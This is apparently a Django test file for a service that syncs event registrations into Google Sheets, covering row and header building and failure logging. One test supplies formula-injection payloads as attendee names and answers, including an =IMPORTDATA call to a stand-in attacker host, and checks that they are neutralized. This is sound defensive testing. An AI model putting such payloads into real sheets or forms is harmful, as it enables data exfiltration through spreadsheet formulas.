from django.test import TestCase

from apps.event.models import RegistrationSheetSyncLog
from apps.event.services.registration_sheet_sync.logs import record_sync_failure
from apps.event.services.registration_sheet_sync.rows import build_header, build_row
from apps.event.tests.helpers import make_event, make_member, make_registration, make_ticket


class RowsHelperTest(TestCase):
    def test_build_header_includes_optional_columns(self):
        event = make_event(collect_phone=True, allow_secondary_email=True)
        header = build_header(event, ["Q1"])
        self.assertIn("Phone", header)
        self.assertIn("Membership Secondary", header)
        self.assertEqual(header[-2], "Q1")
        self.assertEqual(header[-1], "Registration ID")

    def test_build_header_omits_optional_columns(self):
        event = make_event(collect_phone=False, allow_secondary_email=False)
        header = build_header(event, [])
        self.assertNotIn("Phone", header)
        self.assertNotIn("Membership Secondary", header)

    def test_build_row_includes_phone_and_secondary_and_answers(self):
        event = make_event(collect_phone=True, allow_secondary_email=True)
        ticket = make_ticket(event, name="GA")
        member = make_member(email="row@example.com")
        registration = make_registration(
            member,
            event,
            ticket,
            attendee_first_name="Ada",
            attendee_last_name="Lovelace",
            attendee_phone="+15551234567",
            attendee_email="row@example.com",
            attendee_secondary_email="row2@example.com",
            question_answers=[{"question_text": "Q1", "answer": "Yes"}],
        )

        row = build_row(registration, event, ["Q1"], 5)

        self.assertEqual(row[0], "5")
        # The "+"-leading phone is formula-neutralized (quote-prefixed) like the
        # member-sync path; Sheets renders it as the text "+1555…" with no visible
        # apostrophe.
        self.assertIn("'+15551234567", row)
        self.assertIn("row2@example.com", row)
        self.assertEqual(row[-2], "Yes")
        self.assertEqual(row[-1], str(registration.pk))

    def test_build_row_omits_optional_fields_and_blank_answer(self):
        event = make_event(collect_phone=False, allow_secondary_email=False)
        ticket = make_ticket(event, name="GA")
        member = make_member(email="row-min@example.com")
        registration = make_registration(member, event, ticket)

        row = build_row(registration, event, ["Missing"], 1)

        self.assertEqual(row[-2], "")
        self.assertEqual(row[-1], str(registration.pk))
        self.assertNotIn("+15551234567", row)

    def test_build_row_neutralizes_formula_injection(self):
        # Attendee-supplied cells are written with USER_ENTERED, so a value that
        # starts with a formula trigger (=,+,-,@) must be prefixed with a quote
        # to stop Google Sheets from evaluating it (formula/CSV injection).
        event = make_event(collect_phone=True, allow_secondary_email=True)
        ticket = make_ticket(event, name="GA")
        member = make_member(email="evil-row@example.com")
        registration = make_registration(
            member,
            event,
            ticket,
            attendee_first_name='=IMPORTDATA("https://attacker.example/x")',
            attendee_last_name="@SUM(A1:A9)",
            attendee_phone="+15551234567",
            attendee_email="evil-row@example.com",
            attendee_secondary_email="row2@example.com",
            question_answers=[{"question_text": "Q1", "answer": '=HYPERLINK("https://evil","x")'}],
        )

        row = build_row(registration, event, ["Q1"], 5)

        self.assertEqual(row[1], '\'=IMPORTDATA("https://attacker.example/x")')
        self.assertEqual(row[2], "'@SUM(A1:A9)")
        self.assertEqual(row[-2], '\'=HYPERLINK("https://evil","x")')
        # No cell handed to Sheets still begins with a raw formula trigger.
        for cell in row:
            self.assertFalse(cell.startswith(("=", "+", "-", "@")), cell)


class LogsHelperTest(TestCase):
    def setUp(self):
        self.event = make_event(name="Logs Event")

    def test_record_sync_failure_without_sync_type_skips_log(self):
        record_sync_failure(self.event, "oops")

        self.event.refresh_from_db()
        self.assertEqual(self.event.registration_sheet_sync_error, "oops")
        self.assertFalse(RegistrationSheetSyncLog.objects.filter(event=self.event).exists())

    def test_record_sync_failure_preserves_cursor_and_records_rows(self):
        original_cursor = self.event.registration_sheet_synced_at
        record_sync_failure(
            self.event,
            "broke",
            sync_type=RegistrationSheetSyncLog.SyncType.APPEND,
            rows_written=0,
        )

        self.event.refresh_from_db()
        self.assertEqual(self.event.registration_sheet_synced_at, original_cursor)
        log = RegistrationSheetSyncLog.objects.get(event=self.event)
        self.assertEqual(log.status, RegistrationSheetSyncLog.Status.FAILED)
        self.assertEqual(log.error_message, "broke")
        self.assertEqual(log.rows_written, 0)
